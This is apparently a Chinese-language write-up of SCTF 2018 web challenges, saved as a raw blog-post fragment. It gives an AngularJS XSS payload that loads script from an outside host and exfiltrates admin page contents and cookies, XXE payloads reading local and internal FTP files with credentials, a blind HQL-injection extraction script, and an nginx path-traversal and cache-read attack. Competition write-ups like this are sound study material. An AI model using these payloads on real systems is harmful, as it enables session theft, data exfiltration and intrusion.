href=\"/import_and_export/\">import_and_export</a></li>\n          <li><a href=\"/post_bug/\">Post Bug</a></li>\n          <li><a href=\"/auth/logout?url=logout\">Sign Out</a></li>\n        \n            </ul>\n        </div>\n    </div>\n</div>\n\n    \n<div class=\"container\">\n    \n\n    \n<div class=\"page-header\">\n    <h1>Write down your secret plan. Rest assured that no one will see you.</h1>\n</div>\n<ul class=\"posts\">\n    \n<form action=\"\" method=\"post\"\n  class=\"form\" role=\"form\">\n  <input id=\"csrf_token\" name=\"csrf_token\" type=\"hidden\" value=\"Ijc3Mzk4MDMxYmI1NDUwMTA4NTZkOGEzYzhlZjAwZDMxOGZlMjNkMDQi.Dg6C7Q.1hRJWLxrI4d2tPRJMw5y3-WMtpE\">\n  \n    \n\n\n\n\n<div class=\"form-group \"><label class=\"control-label\" for=\"content\">Write your plan</label>\n        \n          <textarea class=\"form-control\" id=\"content\" name=\"content\"></textarea>\n        \n  </div>\n\n\n    \n\n\n\n\n\n  \n\n  \n  \n\n\n    <input class=\"btn btn-default\" id=\"submit\" name=\"submit\" type=\"submit\" value=\"Submit\">\n  \n\n\n\n\n    \n\n</form>\n    \n      <li class=\"post\">\n         <div class=\"post-date\">\n          <span class=\"flask-moment\" data-timestamp=\"2018-05-17T07:46:36Z\" data-format=\"fromNow(0)\" data-refresh=\"0\" style=\"display: none\">2018-05-17T07:46:36Z</span>\n              鏄庢櫄缁村悓缃戞鐨刦tp鏈嶅姟鍣紝syc10ver Eec5TN9fruOOTp2G銆傚瘑鐮佽繖涔堥暱鐪熸槸闅捐锛屽娉ㄤ竴涓媬銆?        </div>\n      </li>\n    \n</ul>\n\n</div>\n\n\n    \n\n    <script src=\"//cdnjs.cloudflare.com/ajax/libs/jquery/1.12.4/jquery.min.js\"></script>\n    <script src=\"//cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.7/js/bootstrap.min.js\"></script>\n<script src=\"//cdnjs.cloudflare.com/ajax/libs/moment.js/2.18.1/moment-with-locales.min.js\"></script>\n<script>\nmoment.locale(\"en\");\nfunction flask_moment_render(elem) {\n    $(elem).text(eval('moment(\"' + $(elem).data('timestamp') + '\").' + $(elem).data('format') + ';'));\n    $(elem).removeClass('flask-moment').show();\n}\nfunction flask_moment_render_all() {\n    $('.flask-moment').each(function() {\n        flask_moment_render(this);\n        if ($(this).data('refresh')) {\n            (function(elem, interval) { setInterval(function() { flask_moment_render(elem) }, interval); })(this, $(this).data('refresh'));\n        }\n    })\n}\n$(document).ready(function() {\n    flask_moment_render_all();\n});\n</script>\n\n  </body>\n</html>\n\n```\n\n从中我们可以得到ftp的账号密码:\n\n> syc10ver         Eec5TN9fruOOTp2G\n\n### xxe 读取/proc/net/arp\n\n```\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE note [\n<!ENTITY file SYSTEM \"file:///proc/net/arp\">\n]>\n<plans>\n    <plan>\n        <content>&file;</content>\n    </plan>\n</plans>\n```\n\n结果如下:\n\n```\n43 minutes ago 172.18.0.1 0x1 0x2 02:42:ca:cd:4e:eb * eth0\n43 minutes ago\n43 minutes ago 172.18.0.4 0x1 0x2 02:42:ac:12:00:04 * eth0\n43 minutes ago\n43 minutes ago 172.18.0.2 0x1 0x2 02:42:ac:12:00:02 * eth0\n```\n\n### xxe读取172.18.0.4:21的目录\n\n```\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE note [\n<!ENTITY file SYSTEM \"ftp://syc10ver:Eec5TN9fruOOTp2G@172.18.0.4:21/\">\n]>\n<plans>\n    <plan>\n        <content>&file;</content>\n    </plan>\n</plans>\n```\n\n结果:\n\n```\n2 minutes ago -rw-r--r-- 1 0 0 38 Jun 17 14:04 flag327a6c4304ad5938eaf0efb6cc3e53dc\n```\n\n### xxe读取172.18.0.4:21/flag327a6c4304ad5938eaf0efb6cc3e53dc\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE note [\n<!ENTITY file SYSTEM \"ftp://syc10ver:Eec5TN9fruOOTp2G@172.18.0.4:21/flag327a6c4304ad5938eaf0efb6cc3e53dc\">\n]>\n<plans>\n    <plan>\n        <content>&file;</content>\n    </plan>\n</plans>\n```\n\n结果:\n\n```\n20 minutes ago sctf{Not_0n1y_xx3_but_als0_web_cache}\n```\n\n##Zhuanxv\n\n### 主要代码片段\n\n```\n//UserLoginAction.class\npublic boolean userCheck(User user) {\n    List < User > userList = this.userService.loginCheck(user.getName(), user.getPassword());\n    if ((userList != null) && (userList.size() == 1)) {\n        return true;\n    }\n    addActionError(\"Username or password is Wrong, please check!\");\n    return false;\n}\n\n//UserServiceImpl.class\npublic List <User> loginCheck(String name, String password) {\n    name = name.replaceAll(\" \", \"\");\n    name = name.replaceAll(\"=\", \"\");\n    Matcher username_matcher = Pattern.compile(\"^[0-9a-zA-Z]+$\").matcher(name);\n    Matcher password_matcher = Pattern.compile(\"^[0-9a-zA-Z]+$\").matcher(password);\n    if (password_matcher.find()) {\n        return this.userDao.loginCheck(name, password);\n    }\n    return null;\n}\n\n//UserDaoImpl.class\npublic List <User> loginCheck(String name, String password) {\n    return getHibernateTemplate().find(\"from User where name ='\" + name + \"' and password = '\" + password + \"'\");\n}\n```\n\n### payload\n\n```\nimport requests\ns=requests.session()\n\n# 漏洞语句 hql\n# from User where name = '\" + name + \"' and password = '\" + password + \"'\"\n# \n# 更简单的payload\n# user.name=1'or(from%0aFlag)like'sctf{%25'or''like'&user.password=asdf\nflag=''\nfor i in range(1,50):\n    p=''\n    for j in range(1,255):\n        # 注意空格需要替换为换行(%0a)或者(%09)W，这是因为代码中将空格替换为\"\"\n        payload=\"(select%0aascii(substr(id,\"+str(i)+\",1))%0afrom%0aFlag%0awhere%0aid<2)<'\"+str(j)+\"'\"\n        #print payload\n        url=\"http://121.196.195.244:9032/zhuanxvlogin?user.name=admin'or%0a\"+payload+\"%0aor%0aname%0alike%0a'admin&user.password=1\"\n        print url\n        r1=s.get(url)\n        #print url\n        #print len(r1.text)\n        if len(r1.text)>20000 and p!='':\n            flag+=p\n            print i,flag\n            break\n        p=chr(j)\n\n# http://121.196.195.244:9032/zhuanxvlogin?user.name=admin'or%0a(select%0Aascii(substr(id,1,1))%0Afrom%0AFlag%0Awhere%0Aid<2)<'116'%0aor%0aname%0alike%0a'admin&user.password=1\n# user.name=1'or(from%0aFlag)like'sctf{%25'or''like'&user.password=aaaa\n```\n\n## BabySyc - Simple PHP Web\n\n```\n\n```","source":"_posts/sctf2018.md","raw":"---\ntitle: sctf2018\ndate: 2018-06-21 09:59:01\ntags: ctf\n---\n\n## 新的建议板\n\n<!--more-->\n\n1. 基础payload\n\n   ```js\n   {{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };eval(alert(1))//');}}\n   ```\n\n2. 打cookie\n\n   ```js\n   {{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };eval(atob(\\'JC5nZXRTY3JpcHQoJ2h0dHBzOi8veHNzcHQuY29tL0hNVHpNUycpCg==\\'))//');}}\n   ```\n\n3. 调用script\n\n   使用\n\n   > $.getScript('https://xsspt.com/HMTzMS')\n\n   > base64一下: `JC5nZXRTY3JpcHQoJ2h0dHBzOi8veHNzcHQuY29tL0hNVHpNUycpCg==`\n\n4. 这样就可以拿到cookie\n\n   接收到的内容如下:\n\n   ```\n   location : http://127.0.0.1:1002/admin/suggest?suggest=%7B%7B'a'.constructor.prototype.charAt=[].join;$eval('x=1%7D%20%7D%20%7D;eval(atob(%5C'JC5nZXRTY3JpcHQoJ2h0dHBzOi8veHNzcHQuY29tL0hNVHpNUycpCg==%5C'))//');%7D%7D\n   ```\n\n5. cookie里边并没有flag，并且给的地址为本地地址，并不在公网上。\n\n6. 获取`/admin`的内容\n\n   ```\n   JC5nZXRTY3JpcHQoJ2h0dHA6Ly8xMjMuMjA3LjkwLjE0My9zdS5qcycpCg==\n   =>\n   $.getScript('http://123.207.90.143/su.js')\n   ```\n\n   ```\n   {{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };eval(atob(\\'JC5nZXRTY3JpcHQoJ2h0dHA6Ly8xMjMuMjA3LjkwLjE0My9zdS5qcycpCg==\\'))//');}}\n   ```\n\n7. su.js内容即paylaod如下：\n\n   ```\n   $.ajax({\n       url: \"/admin\",\n       type: \"GET\",\n       dataType: \"text\",\n       success: function(result) {\n           var code = btoa(encodeURIComponent(result));\n           xssPost('http://123.207.90.143', code);\n       },\n       error: function(msg) {\n   \n       }\n   })\n   \n   function xssPost(url, postStr) {\n       var de;\n       de = document.body.appendChild(document.createElement('iframe'));\n       de.src = 'about:blank';\n       de.height = 1;\n       de.width = 1;\n       de.contentDocument.write('<form method=\"GET\" action=\"' + url + '\"><input name=\"code\" value=\"' + postStr + '\"/></form>');\n       de.contentDocument.forms[0].submit();\n       de.style.display = 'none';\n   }\n   ```\n\n8. admin内容如下:\n\n   ```\n   JTBEJTBBJTNDIURPQ1RZUEUlMjBodG1sJTNFJTBEJTBBJTNDaHRtbCUyMGxhbmclM0QlMjJ6aC1DTiUyMiUzRSUwRCUwQSUyMCUyMCUzQ2hlYWQlM0UlMEQlMEElMjAlMjAlMjAlMjAlM0NtZXRhJTIwY2hhcnNldCUzRCUyMnV0Zi04JTIyJTNFJTBEJTBBJTIwJTIwJTIwJTIwJTNDbWV0YSUyMGh0dHAtZXF1aXYlM0QlMjJYLVVBLUNvbXBhdGlibGUlMjIlMjBjb250ZW50JTNEJTIySUUlM0RlZGdlJTIyJTNFJTBEJTBBJTIwJTIwJTIwJTIwJTNDbWV0YSUyMG5hbWUlM0QlMjJ2aWV3cG9ydCUyMiUyMGNvbnRlbnQlM0QlMjJ3aWR0aCUzRGRldmljZS13aWR0aCUyQyUyMGluaXRpYWwtc2NhbGUlM0QxJTIyJTNFJTBEJTBBJTIwJTIwJTIwJTIwJTNDIS0tJTIwJUU0JUI4JThBJUU4JUJGJUIwMyVFNCVCOCVBQW1ldGElRTYlQTAlODclRTclQUQlQkUqJUU1JUJGJTg1JUU5JUExJUJCKiVFNiU5NCVCRSVFNSU5QyVBOCVFNiU5QyU4MCVFNSU4OSU4RCVFOSU5RCVBMiVFRiVCQyU4QyVFNCVCQiVCQiVFNCVCRCU5NSVFNSU4NSVCNiVFNCVCQiU5NiVFNSU4NiU4NSVFNSVBRSVCOSVFOSU4MyVCRColRTUlQkYlODUlRTklQTElQkIqJUU4JUI3JTlGJUU5JTlBJThGJUU1JTg1JUI2JUU1JTkwJThFJUVGJUJDJTgxJTIwLS0lM0UlMEQlMEElMjAlMjAlMjAlMjAlM0NtZXRhJTIwbmFtZSUzRCUyMmRlc2NyaXB0aW9uJTIyJTIwY29udGVudCUzRCUyMiUyMiUzRSUwRCUwQSUyMCUyMCUyMCUyMCUzQ21ldGElMjBuYW1lJTNEJTIyYXV0aG9yJTIyJTIwY29udGVudCUzRCUyMiUyMiUzRSUwRCUwQSUyMCUyMCUyMCUyMCUzQ2xpbmslMjByZWwlM0QlMjJpY29uJTIyJTIwaHJlZiUzRCUyMiUyMiUzRSUwRCUwQSUwRCUwQSUyMCUyMCUyMCUyMCUzQ3RpdGxlJTNFU1lDJTNDJTJGdGl0bGUlM0UlMEQlMEElMEQlMEElMEQlMEElMjAlMjAlMjAlMjAlM0NsaW5rJTIwaHJlZiUzRCUyMmh0dHBzJTNBJTJGJTJGY2RuLmJvb3Rjc3MuY29tJTJGYm9vdHN0cmFwJTJGMy4zLjclMkZjc3MlMkZib290c3RyYXAubWluLmNzcyUyMiUyMHJlbCUzRCUyMnN0eWxlc2hlZXQlMjIlM0UlMEQlMEElMjAlMjAlMjAlMjAlM0NsaW5rJTIwaHJlZiUzRCUyMmNzcyUyRmllMTAtdmlld3BvcnQtYnVnLXdvcmthcm91bmQuY3NzJTIyJTIwcmVsJTNEJTIyc3R5bGVzaGVldCUyMiUzRSUwRCUwQSUyMCUyMCUyMCUyMCUzQ2xpbmslMjBocmVmJTNEJTIyY3NzJTJGc3RhcnRlci10ZW1wbGF0ZS5jc3MlMjIlMjByZWwlM0QlMjJzdHlsZXNoZWV0JTIyJTNFJTBEJTBBJTIwJTIwJTIwJTIwJTNDc3R5bGUlMjB0eXBlJTNEJTIydGV4dCUyRmNzcyUyMiUzRSUwRCUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMGJvZHklMjAlN0IlMEQlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjBwYWRkaW5nLXRvcCUzQSUyMDYwcHglM0IlMEQlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjBwYWRkaW5nLWJvdHRvbSUzQSUyMDQwcHglM0IlMEQlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlN0QlMEQlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlM0MlMkZzdHlsZSUzRSUwRCUwQSUwRCUwQSUyMCUyMCUyMCUyMCUzQ3NjcmlwdCUyMHNyYyUzRCUyMmh0dHBzJTNBJTJGJTJGY2RuLmJvb3Rjc3MuY29tJTJGYW5ndWxhci5qcyUyRjEuNC42JTJGYW5ndWxhci5taW4uanMlMjIlM0UlM0MlMkZzY3JpcHQlM0UlMEQlMEElMjAlMjAlMjAlMjAlM0NzY3JpcHQlMjBzcmMlM0QlMjJodHRwcyUzQSUyRiUyRmFwcHMuYmRpbWcuY29tJTJGbGlicyUyRmFuZ3VsYXItcm91dGUlMkYxLjMuMTMlMkZhbmd1bGFyLXJvdXRlLmpzJTIyJTNFJTNDJTJGc2NyaXB0JTNFJTBEJTBBJTIwJTIwJTIwJTIwJTNDc2NyaXB0JTIwc3JjJTNEJTIyanMlMkZpZS1lbXVsYXRpb24tbW9kZXMtd2FybmluZy5qcyUyMiUzRSUzQyUyRnNjcmlwdCUzRSUwRCUwQSUwRCUwQSUyMCUyMCUzQyUyRmhlYWQlM0UlMEQlMEElMEQlMEElMjAlMjAlM0Nib2R5JTIwJTNFJTBEJTBBJTBEJTBBJTIwJTIwJTIwJTIwJTNDbmF2JTIwY2xhc3MlM0QlMjJuYXZiYXIlMjBuYXZiYXItaW52ZXJzZSUyMG5hdmJhci1maXhlZC10b3AlMjIlM0UlMEQlMEElMjAlMjAlMjAlMjAlMjAlMjAlM0NkaXYlMjBjbGFzcyUzRCUyMmNvbnRhaW5lciUyMiUzRSUwRCUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUzQ2RpdiUyMGNsYXNzJTNEJTIybmF2YmFyLWhlYWRlciUyMiUzRSUwRCUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUzQ2J1dHRvbiUyMHR5cGUlM0QlMjJidXR0b24lMjIlMjBjbGFzcyUzRCUyMm5hdmJhci10b2dnbGUlMjBjb2xsYXBzZWQlMjIlMjBkYXRhLXRvZ2dsZSUzRCUyMmNvbGxhcHNlJTIyJTIwZGF0YS10YXJnZXQlM0QlMjIlMjNuYXZiYXIlMjIlMjBhcmlhLWV4cGFuZGVkJTNEJTIyZmFsc2UlMjIlMjBhcmlhLWNvbnRyb2xzJTNEJTIybmF2YmFyJTIyJTNFJTBEJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTNDc3BhbiUyMGNsYXNzJTNEJTIyc3Itb25seSUyMiUzRVRvZ2dsZSUyMG5hdmlnYXRpb24lM0MlMkZzcGFuJTNFJTBEJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTNDc3BhbiUyMGNsYXNzJTNEJTIyaWNvbi1iYXIlMjIlM0UlM0MlMkZzcGFuJTNFJTBEJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTNDc3BhbiUyMGNsYXNzJTNEJTIyaWNvbi1iYXIlMjIlM0UlM0MlMkZzcGFuJTNFJTBEJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTNDc3BhbiUyMGNsYXNzJTNEJTIyaWNvbi1iYXIlMjIlM0UlM0MlMkZzcGFuJTNFJTBEJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTNDJTJGYnV0dG9uJTNFJTBEJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTNDYSUyMGNsYXNzJTNEJTIybmF2YmFyLWJyYW5kJTIyJTIwaHJlZiUzRCUyMiUyRiUyMiUzRVNZQyUyMEFETUlOJTNDJTJGYSUzRSUwRCUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUzQyUyRmRpdiUzRSUwRCUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUzQ2RpdiUyMGlkJTNEJTIybmF2YmFyJTIyJTIwY2xhc3MlM0QlMjJjb2xsYXBzZSUyMG5hdmJhci1jb2xsYXBzZSUyMiUzRSUwRCUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUzQ3VsJTIwY2xhc3MlM0QlMjJuYXYlMjBuYXZiYXItbmF2JTIyJTNFJTBEJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTNDbGklMjBjbGFzcyUzRCUyMmFjdGl2ZSUyMiUzRSUzQ2ElMjBocmVmJTNEJTIyJTIzJTIyJTNFSG9tZSUzQyUyRmElM0UlM0MlMkZsaSUzRSUwRCUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUzQ2xpJTNFJTNDYSUyMGhyZWYlM0QlMjIlMjMlMjIlM0UlRTYlOTclQTUlRTUlQkYlOTclM0MlMkZhJTNFJTNDJTJGbGklM0UlMEQlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlM0NsaSUzRSUzQ2ElMjBocmVmJTNEJTIyJTIzJTIyJTNFJUU4JUI0JUE2JUU1JThEJTk1JTNDJTJGYSUzRSUzQyUyRmxpJTNFJTBEJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTNDbGklM0UlM0NhJTIwaHJlZiUzRCUyMmFkbWluJTJGZmlsZSUyMiUzRSVFNiU5NiU4NyVFNCVCQiVCNiUzQyUyRmElM0UlM0MlMkZsaSUzRSUwRCUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUzQ2xpJTNFJTNDYSUyMGhyZWYlM0QlMjJhZG1pbiUyRnN1Z2dlc3QlMjIlM0UlRTclOTUlOTklRTglQTglODAlM0MlMkZhJTNFJTNDJTJGbGklM0UlMEQlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlM0NsaSUzRSUzQ2ElMjBocmVmJTNEJTIyJTIzJTIyJTNFJUU1JThGJTkxJUU1JUI4JTgzJTNDJTJGYSUzRSUzQyUyRmxpJTNFJTBEJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTNDJTJGdWwlM0UlMEQlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlM0MlMkZkaXYlM0UlMEQlMEElMjAlMjAlMjAlMjAlMjAlMjAlM0MlMkZkaXYlM0UlMEQlMEElMjAlMjAlMjAlMjAlM0MlMkZuYXYlM0UlMEQlMEElMEQlMEElMEQlMEElM0NkaXYlMjBjbGFzcyUzRCUyMmNvbnRhaW5lciUyMiUzRSUwRCUwQSUyMCUyMCUzQ2RpdiUyMGNsYXNzJTNEJTIyanVtYm90cm9uJTIyJTNFJTBEJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTNDaDElM0VIRUxMTyUyMGFkbWluQ2xvdW5kJTNDJTJGaDElM0UlMEQlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlM0NwJTNFJUU2JTk2JUIwJUU3JTg5JTg4JUU1JTkwJThFJUU1JThGJUIwMi4wISUzQyUyRnAlM0UlMEQlMEElMjAlMjAlM0MlMkZkaXYlM0UlMEQlMEElM0MlMkZkaXYlM0UlMEQlMEElMEQlMEElMEQlMEElMjAlMjAlMjAlMjAlM0MhLS0lMjBCb290c3RyYXAlMjBjb3JlJTIwSmF2YVNjcmlwdCUwRCUwQSUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUzRCUyMC0tJTNFJTBEJTBBJTNDIS0tJTIwUGxhY2VkJTIwYXQlMjB0aGUlMjBlbmQlMjBvZiUyMHRoZSUyMGRvY3VtZW50JTIwc28lMjB0aGUlMjBwYWdlcyUyMGxvYWQlMjBmYXN0ZXIlMjAtLSUzRSUwRCUwQSUzQ3NjcmlwdCUyMHNyYyUzRCUyMmh0dHBzJTNBJTJGJTJGY2RuLmJvb3Rjc3MuY29tJTJGanF1ZXJ5JTJGMS4xMi40JTJGanF1ZXJ5Lm1pbi5qcyUyMiUzRSUzQyUyRnNjcmlwdCUzRSUwRCUwQSUzQ3NjcmlwdCUyMHNyYyUzRCUyMmh0dHBzJTNBJTJGJTJGY2RuLmJvb3Rjc3MuY29tJTJGYm9vdHN0cmFwJTJGMy4zLjclMkZqcyUyRmJvb3RzdHJhcC5taW4uanMlMjIlM0UlM0MlMkZzY3JpcHQlM0UlMEQlMEElM0MhLS0lMjBJRTEwJTIwdmlld3BvcnQlMjBoYWNrJTIwZm9yJTIwU3VyZmFjZSUyRmRlc2t0b3AlMjBXaW5kb3dzJTIwOCUyMGJ1ZyUyMC0tJTNFJTBEJTBBJTNDc2NyaXB0JTIwc3JjJTNEJTIyanMlMkZpZTEwLXZpZXdwb3J0LWJ1Zy13b3JrYXJvdW5kLmpzJTIyJTNFJTNDJTJGc2NyaXB0JTNFJTBEJTBBJTBEJTBBJTNDJTJGYm9keSUzRSUwRCUwQSUzQyUyRmh0bWwlM0UlMEQlMEElMEQlMEE%3D\n   ```\n\n   解码后:\n\n   ```\n   ...\n   <div class=\"container\">\n     <div class=\"jumbotron\">\n           <h1>HELLO adminClound</h1>\n           <p>新版后台2.0!</p>\n     </div>\n   </div>\n   ...\n   ```\n\n9. 获取`admin/file`，需要登录\n\n   ```\n   <div class=\"container\">\n     <form method=\"post\">\n       <label for=\"filePasswd\" class=\"sr-only\">输入文件密码</label>\n       <input type=\"text\" id=\"filePasswd\" class=\"form-control\" placeholder=\"filepasswd\" required=\"\" autofocus=\"\" name=\"filepasswd\">\n       <button class=\"btn btn-lg btn-primary btn-block\" type=\"submit\">提交</button>\n     </form>\n   </div>\n   ```\n\n10. 我们发现新的用户\n\n  ```\n  adminClound\n  ```\n\n  结合路由:\n\n  ```\n  http://116.62.137.114:4879/api/memos/admintest2313\n  ```\n\n  访问`http://116.62.137.114:4879/api/memos/adminClound`\n\n  得到`adminClound`的密码:`HGf^&39NsslUIf^23`\n\n11. 登录`admin/file`\n\n    paylaod如下：\n\n    ```\n    $.ajax({\n        url: \"/admin/file\",\n        type: \"POST\",\n        data: \"filepasswd=HGf%5E%2639NsslUIf%5E23\",\n        dataType: \"text\",\n        success: function(result) {\n            var code = btoa(encodeURIComponent(result));\n            xssPost('http://123.207.90.143', code);\n        },\n        error: function(msg) {\n    \n        }\n    })\n    \n    function xssPost(url, postStr) {\n        var de;\n        de = document.body.appendChild(document.createElement('iframe'));\n        de.src = 'about:blank';\n        de.height = 1;\n        de.width = 1;\n        de.contentDocument.write('<form method=\"GET\" action=\"' + url + '\"><input name=\"code\" value=\"' + postStr + '\"/></form>');\n        de.contentDocument.forms[0].submit();\n        de.style.display = 'none';\n    }\n    \n    ```\n\n    得到flag:`sctf{T4is_is_f1ag2313}`。\n\n\n## nginx的秘密\n\n>hint4:/editxxxxx怎么也能访问? \n>\n>hint3:路由嘛，扫一扫目录就知道了。views.py是读不出来的233333 \n>\n>hint2:这个路由好生奇怪 \n>\n>hint1:从nginx的典型错误配置入手吧 \n\n### 目录穿越漏洞\n\n> -syc-note 我已经把所有秘密写进secret plan了233333 \n\n​ 需要读取secret plain\n\n首先可以发现nginx存在目录穿越漏洞，可以参考[https://github.com/vulhub/vulhub/tree/master/nginx/insecure-configuration](https://github.com/vulhub/vulhub/tree/master/nginx/insecure-configuration)。\n\n访问`http://116.62.137.155:4455/static../etc/nginx/nginx.conf> `，即可得到nginx.conf\n\n### 理解proxy_cache_path\n\n```\nuser www-data;\nworker_processes auto;\npid /run/nginx.pid;\n\nevents {\n  worker_connections 768;\n  # multi_accept on;\n}\n\nhttp {\n\n  ##\n  # Basic Settings\n  ##\n\n  sendfile on;\n  tcp_nopush on;\n  tcp_nodelay on;\n  keepalive_timeout 65;\n  types_hash_max_size 2048;\n  # server_tokens off;\n\n  # server_names_hash_bucket_size 64;\n  # server_name_in_redirect off;\n\n  include /etc/nginx/mime.types;\n  default_type application/octet-stream;\n\n  ##\n  # SSL Settings\n  ##\n\n  ssl_protocols TLSv1 TLSv1.1 TLSv1.2; # Dropping SSLv3, ref: POODLE\n  ssl_prefer_server_ciphers on;\n\n  ##\n  # Logging Settings\n  ##\n\n  #access_log /var/log/nginx/access.log;\n  #error_log /var/log/nginx/error.log;\n\n  ##\n  # Gzip Settings\n  ##\n\n  gzip on;\n  gzip_disable \"msie6\";\n\n  # gzip_vary on;\n  # gzip_proxied any;\n  # gzip_comp_level 6;\n  # gzip_buffers 16 8k;\n  # gzip_http_version 1.1;\n  # gzip_types text/plain text/css application/json application/javascript text/xml application/xml application/xml+rss text/javascript;\n\n  proxy_cache_path /tmp/mycache levels=1:2 keys_zone=my_cache:10m max_size=10g inactive=30s use_temp_path=off;\n  \n  limit_conn_zone $binary_remote_addr zone=conn:10m;\n  limit_req_zone  $binary_remote_addr zone=allips:10m rate=2r/s;\n\n  \n  server {\n      listen 4455 default_server;\n      server_name localhost;\n\n      location /static {\n          alias /home/;\n      }\n\n      location ~* \\.(css|js|gif|png){\n          proxy_cache             my_cache;\n          proxy_cache_valid       200 30s;\n          proxy_pass              http://bugweb.app:8000;\n          proxy_set_header        Host $host:$server_port;\n          proxy_ignore_headers    Expires Cache-Control Set-Cookie;\n      }\n\n      location / {\n          limit_conn conn 10;\n          proxy_pass       http://bugweb.app:8000;\n          proxy_set_header Host $host:$server_port;\n      }\n  }\n  ##\n  # Virtual Host Configs\n  ##\n\n  include /etc/nginx/conf.d/*.conf;\n  include /etc/nginx/sites-enabled/*;\n}\n\n\n#mail {\n# # See sample authentication script at:\n# # http://wiki.nginx.org/ImapAuthenticateWithApachePhpScript\n# \n# # auth_http localhost/auth.php;\n# # pop3_capabilities \"TOP\" \"USER\";\n# # imap_capabilities \"IMAP4rev1\" \"UIDPLUS\";\n# \n# server {\n#   listen     localhost:110;\n#   protocol   pop3;\n#   proxy      on;\n# }\n# \n# server {\n#   listen     localhost:143;\n#   protocol   imap;\n#   proxy      on;\n# }\n#}\n```\n\n其中最重要的是这句话:\n\n```\nproxy_cache_path /tmp/mycache levels=1:2 keys_zone=my_cache:10m max_size=10g inactive=30s use_temp_path=off;\n```\n\n匹配到~* .(css|js|gif|png)就进行缓存。\n\n查看文档<http://nginx.org/en/docs/http/ngx_http_proxy_module.html#proxy_cache_path> 了解proxy_cache_path的值的含义，得知缓存文件保存在/tmp/mycache，用于定义缓存文件名的proxy_cache_key未设置，则使用默认值 \\$scheme\\$proxy_host\\$request_uri，即文件名形式为MD5(\\$scheme\\$proxy_host\\$request_uri),如果访问<http://116.62.137.155:4455/write_plan/a.js/> ，则缓存文件名为MD5(<http://bugweb.app:8000/write_plan/a.js/>) ==6fcfa7b1e6bad837b70dc98c9b82b43b，由于proxy_cache_path设置了levels=1:2，因此缓存文件存在/tmp/mycache下的两级目录下，第一级目录名取MD5值的最后一个字符，第二级目录名取MD5值的倒数2、3个字符，例如/tmp/mycache/b/43/6fcfa7b1e6bad837b70dc98c9b82b43b，再通过任意文件读取即可读到缓存文件的内容。\n\n### 读取secret_plain\n\n由于路由很奇怪，访问/editxxxxx等同于访问/edit，同理访问/write_planxxxx等同于访问/write_planxxxx。因而构造<http://116.62.137.155:4455/write_plan/a.js/> 提交给管理员访问， 管理员在查看该页面之后，也就相当于访问了管理员的`http://116.62.137.155:4455/write_plan`,并生成了缓存文件，这时候再读取缓存文件。\n\n`http://116.62.137.155:4455/static../tmp/mycache/b/43/6fcfa7b1e6bad837b70dc98c9b82b43b`\n\n```\n\u0003       嬹,[    m?[    ,R泻  ? \u000f\u0001                                                                                                      \nKEY: http://bugweb.app:8000/write_plan/a.js/\nHTTP/1.0 200 OK\nContent-Type: text/html; charset=utf-8\nContent-Length: 3555\n\n<!DOCTYPE html>\n<html>\n  <head>\n\n    <title>post bug</title>\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <!-- Bootstrap -->\n    <link href=\"//cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.7/css/bootstrap.min.css\" rel=\"stylesheet\">\n<link rel=\"shortcut icon\" href=\"/static/favicon.ico\" type=\"image/x-icon\">\n<link rel=\"icon\" href=\"/static/favicon.ico\" type=\"image/x-icon\">\n\n  </head>\n  <body>\n    \n<div class=\"navbar navbar-inverse\" role=\"navigation\">\n    <div class=\"container\">\n        <div class=\"navbar-header\">\n            <button type=\"button\" 